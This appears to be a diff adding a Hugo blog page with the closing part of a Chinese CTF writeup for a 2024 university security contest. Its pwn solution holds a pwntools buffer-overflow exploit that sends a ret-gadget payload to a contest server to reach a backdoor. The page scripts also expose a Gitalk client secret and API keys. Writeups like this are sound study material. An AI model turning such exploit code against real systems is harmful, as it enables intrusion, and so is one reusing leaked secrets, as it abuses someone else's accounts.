+</span></span><span class="line"><span class="cl">with open(&#39;a&#39;,&#39;wb&#39;) as f:
+</span></span><span class="line"><span class="cl">    f.write(datas)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">p.interactive()
+</span></span></code></pre></div><p>提取成功，找到后门
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714996795308-bf233b5b-65dd-4af5-b558-fe74bf5ea687.png" alt="798c4c64bc527cfdfb112297a2aba3a.png">
+找gadgets
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714996814489-e62ce271-ef49-48db-b399-d15b31f702e4.png" alt="439b7b4556526a0ec73c101ae0b03e5b_.png"></p>
+<ul>
+<li>exp</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;prob04.contest.pku.edu.cn&#39;</span><span class="p">,</span> <span class="mi">10004</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Please input your token: &#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s1">&#39;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Username: &#39;</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">Gadgets information
+</span></span></span><span class="line"><span class="cl"><span class="s1">============================================================
+</span></span></span><span class="line"><span class="cl"><span class="s1">0x000000000040101a : ret
+</span></span></span><span class="line"><span class="cl"><span class="s1">0x0000000000401359 : ret 0x1be
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">40</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">41</span> <span class="o">-</span> <span class="mi">40</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">48</span> <span class="o">+</span> <span class="mi">96</span> <span class="o">-</span> <span class="mi">41</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40101a</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40127e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Password: &#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714998007875-ba0fadb1-4b37-4774-988e-40dc7a35e266.png" alt="image.png"></p></div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/ctf"
+        rel="tag"
+        >CTF</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_44.webp"
+              data-sizes="auto"
+              alt="NCTF 2023"
+              class="lazyload"
+            /><a
+          href="/post/nctf-2023/"
+          aria-label="前一篇:NCTF 2023"
+          title="前一篇:NCTF 2023"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">NCTF 2023</h3>
+      </div><div class="article-nav-link-wrap right"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_66.webp"
+              data-sizes="auto"
+              alt="CISCN2024"
+              class="lazyload"
+            /><a
+          href="/post/ciscn2024/"
+          aria-label="后一篇:CISCN2024"
+          title="后一篇:CISCN2024"
+        ></a>
+        <div class="article-nav-caption">后一篇</div>
+        <h3 class="article-nav-title">CISCN2024</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="gitalk">
+          <span>gitalk</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment gitalk-comment" data-aos="fade-up"
+     id="gitalk-comment">
+    </div></div>
+</section></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      Ya1orin
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;97.1k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:38</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#签到">签到</a></li>
+        <li><a href="#钓鱼邮件识别">钓鱼邮件识别</a>
+          <ul>
+            <li><a href="#flag1">Flag1</a></li>
+            <li><a href="#flag2">Flag2</a></li>
+            <li><a href="#flag3">Flag3</a></li>
+          </ul>
+        </li>
+        <li><a href="#easyshell">easyshell</a></li>
+        <li><a href="#secretdb">SecretDB</a></li>
+        <li><a href="#gateway">Gateway</a></li>
+        <li><a href="#apache">Apache</a></li>
+        <li><a href="#f-or-r">f or r</a></li>
+        <li><a href="#zip">zip</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#phpsql">phpsql</a></li>
+        <li><a href="#pyssrf">pyssrf</a></li>
+        <li><a href="#fileit">fileit</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse">Reverse</a>
+      <ul>
+        <li><a href="#ezayre">ezayre</a></li>
+        <li><a href="#babyre">babyre</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#babypwn">babypwn</a></li>
+        <li><a href="#login">Login</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" ></script><script src="/js/aos.js" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax></script><script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "G5DS5ZI3YM",
+        apiKey: "90bf1b7c38d7240c582e5c8a29bff9ab",
+        indexName: "Blog",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": '搜索.....',
+          "hits_empty": '未发现与 「${query}」相关内容',
+          "hits_stats": '找到${hits}条结果（用时 ${time} ms）'
+        }
+      }
+    };
+  </script><script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js"
+    deferintegrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l&#43;M5Q2WH/Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous"></script><script src="/js/algolia_search.js" ></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+    if (window.firework) {
+      const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+      options.excludeElements = options.excludeelements;
+      delete options.excludeelements;
+      window.firework(options);
+    }
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Ya1orin",
+          title: "高校网络安全管理运维赛2024",
+          url: "http:\/\/localhost:1313\/post\/%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B2024\/",
+          description: "高校网络安全管理运维赛2024 Writeup",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: 'Ov23li64Bz4egFDpBVAa',
+            clientSecret: 'ff0e7ea9d99ed40adbfcb4bf88ff2b95918d9dd7',
+            repo: 'Blog-comment',
+            owner: 'Ya1orin',
+            admin: JSON.parse("\"Ya1orin\""),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },};
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig?.[key]?.enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'gitalk';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig?.[sys]?.enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js"
+    data-pjaxintegrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC&#43;gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js"
+    data-pjaxintegrity="sha384-hCXGrW6PitJEwbkoStFjeJxv&#43;fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script data-pjax>
+          var renderMath = () => {
+            if (!window.renderMathInElement) return;
+            window.renderMathInElement(_$("article"), {
+              delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "\\[", right: "\\]", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+              ],
+            });
+          };
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", renderMath, { once: true });
+          } else {
+            renderMath();
+          }
+        </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
